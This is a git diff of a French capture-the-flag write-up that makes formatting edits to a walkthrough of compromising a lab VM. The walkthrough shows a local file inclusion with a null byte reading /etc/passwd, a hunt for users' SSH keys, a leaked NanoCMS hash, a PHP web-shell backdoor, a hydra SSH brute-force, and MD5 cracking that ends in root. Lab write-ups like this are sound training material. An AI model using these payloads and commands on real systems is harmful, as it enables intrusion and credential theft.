@@ -91,26 +91,26 @@ Host script results:
 |_smbv2-enabled: Server doesn't support SMBv2 protocol
 ```
 
-Il y a différents services qui peuvent nous intéresser mais je me suis tourné directement vers le site web qui est celui de la *Phake Organization*.  
+Il y a différents services qui peuvent nous intéresser, mais je me suis tourné directement vers le site web qui est celui de la *Phake Organization*.  
 
 Sur ce site on trouve :  
 
 * des urls qui prennent un paramètre page
-* un blog *NanoCMS* sous le path */~andy/*
-* ce qui semble être un *Drupal* sous */events/*
-* Un formulaire d'inscription à une maling-list sous */list/*
-* une page avec un formulaire de contact (*?page=contact*)
+* un blog *NanoCMS* sous le path `/~andy/`
+* ce qui semble être un *Drupal* sous `/events/`
+* Un formulaire d'inscription à une maling-list sous `/list/`
+* une page avec un formulaire de contact (`?page=contact`)
 
 Attaque
 -------
 
-La faille est d'une banalité navrante : si on demande ?page=yop on obtient des erreurs PHP bien trop bavardes.  
+La faille est d'une banalité navrante : si on demande `?page=yop` on obtient des erreurs PHP bien trop bavardes.  
 
 ```
 Warning: include_once(inc/yop.php) [function.include-once]: failed to open stream: No such file or directory in /var/www/html/index.php on line 6
 ```
 
-L'inclusion est donc relative et ajoute une extension. Il est alors possible de remonter l'arborescence et de placer un null byte pour casser l'ajout de l'extension. Ainsi avec *?page=../../../../../../../../etc/passwd%00* on obtient :  
+L'inclusion est donc relative et ajoute une extension. Il est alors possible de remonter l'arborescence et de placer un null byte pour casser l'ajout de l'extension. Ainsi avec `?page=../../../../../../../../etc/passwd%00` on obtient :  
 
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -179,7 +179,7 @@ while True:
 fd.close()
 ```
 
-Evidemment à vous de remplir préalablement le fichier *logs.txt* avec des paths de fichiers intéressants (les *.ssh/id\_rsa* des utilisateurs par exemple).  
+Evidemment à vous de remplir préalablement le fichier `logs.txt` avec des paths de fichiers intéressants (les `.ssh/id_rsa` des utilisateurs par exemple).  
 
 J'obtiens l'output suivant :  
 
@@ -209,31 +209,31 @@ Contenu trouve avec /home/amy/.bashrc
 Contenu trouve avec /home/loren/.bashrc
 ```
 
-Pas grand chose d'intéressant : on parvient à accéder aux *.bashrc* mais pas aux clés SSH. Les logs *Apache* sont eux aussi inaccessibles.  
+Pas grand-chose d'intéressant : on parvient à accéder aux `.bashrc` mais pas aux clés SSH. Les logs *Apache* sont, eux aussi, inaccessibles.  
 
-Après avoir testé différentes urls du type */~nom\_utilisateur*, il semble que seul andy exploite le module *user\_dir* d'*Apache* dont rien de plus à fouiller ici.  
+Après avoir testé différentes urls du type `/~nom_utilisateur`, il semble que seul `andy` exploite le module `user_dir` d'*Apache* dont rien de plus à fouiller ici.  
 
 Une recherche rapide sur Internet et je trouve une vulnérabilité concernant *NanoCMS* : ce système de blog sans base de données stocke les hashs des utilisateurs [dans un fichier texte accessible à tous](http://www.securityfocus.com/bid/34508).  
 
-Ainsi à l'adresse */~andy/data/pagesdata.txt* j'obtiens (il s'agit d'un extrait) :  
+Ainsi à l'adresse `/~andy/data/pagesdata.txt` j'obtiens (il s'agit d'un extrait) :  
 
 ```
 s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";
 ```
 
-Une autre recherche rapide permet de retrouver ce hash sur le web qui correspond au mot de passe *shannon*.  
+Une autre recherche rapide permet de retrouver ce hash sur le web qui correspond au mot de passe `shannon`.  
 
-Une fois connecté en admin il est très aisé de créer une nouvelle page php pour y placer par exemple une backdoor.  
+Une fois connecté en admin, il est très aisé de créer une nouvelle page php pour y placer par exemple une backdoor.  
 
 ![NanoCMS edit a PHP webpage](/assets/img/ctf5.png)
 
-On peut ensuite lancer des commandes simplement via */~andy/data/pages/pwned.php?cmd=ls*  
+On peut ensuite lancer des commandes simplement via `/~andy/data/pages/pwned.php?cmd=ls`  
 
 Mais cet accès ne semble pas apporter plus d'informations...  
 
 J'ai préféré lancer une attaque brute-force sur les comptes SSH en utilisant une liste des 500 pires mots de passe.  
 
-```
+```console
 $ ./hydra -L users.txt -P top500.txt -e nsr ssh://192.168.1.69
 Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -253,7 +253,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2014-07-14 14:56:21
 
 Hydra a trouvé le password *dolphins* pour l'utilisatrice *amy*.  
 
-```
+```console
 $ ssh amy@192.168.1.69
 amy@192.168.1.69's password: 
 [amy@localhost ~]$ history
@@ -278,7 +278,7 @@ Sorry, user amy may not run sudo on localhost.
 
 Bon, il ne faut pas fouiller de ce côté.  
 
-Dans le fichier de configuration du *Drupal* (*/var/www/html/events/sites/default/settings.php*) on trouve un identifiant pour la base de données :  
+Dans le fichier de configuration du *Drupal* (`/var/www/html/events/sites/default/settings.php`) on trouve un identifiant pour la base de données :  
 
 ```php
 $db_url = 'mysql://root:mysqlpassword@localhost/drupal';
@@ -316,9 +316,9 @@ mysql> select uid,name,pass from users;
 +-----+----------+----------------------------------+
 ```
 
-Il s'agit de hashs MD5, j'en ai cassé deux via JtR :  
+Il s'agit de hashes MD5, j'en ai cassé deux via JtR :  
 
-```
+```console
 $ /opt/jtr/john --wordlist=mega_dict.txt --format=raw-md5 hash.txt 
 Loaded 5 password hashes with no different salts (Raw MD5 [128/128 AVX intrinsics 12x])
 password         (patrick)
@@ -338,7 +338,7 @@ Mais cela ne me donne toujours pas d'accès root.
 Escalade de privilèges
 ----------------------
 
-Dans */var/spool/mail/* on trouve un email pour *amy* :
+Dans `/var/spool/mail/` on trouve un email pour *amy* :
 
 ```
 From apache@localhost.localdomain  Wed Apr 29 13:00:34 2009
@@ -383,7 +383,7 @@ After logging in, you will be redirected to http://192.168.229.129/events/?q=use
 
 Visiblement *Patrick* est l'administrateur... Nous allons fouillez dans son répertoire personnel en détail.  
 
-Finalement je trouve un dossier *.tomboy* qui correspond à [une application de prise de notes Gnome-powered](https://wiki.gnome.org/Apps/Tomboy).  
+Finalement je trouve un dossier `.tomboy` qui correspond à [une application de prise de notes Gnome-powered](https://wiki.gnome.org/Apps/Tomboy).  
 
 Or une note est particulièrement intéressante :  
 
@@ -410,7 +410,7 @@ Root password
 
 F\*\*tus beatniks :D Il n'y a plus qu'à passer root via su :  
 
-```
+```console
 [amy@localhost ~]$ su 
 Mot de passe : 
 [root@localhost amy]# id
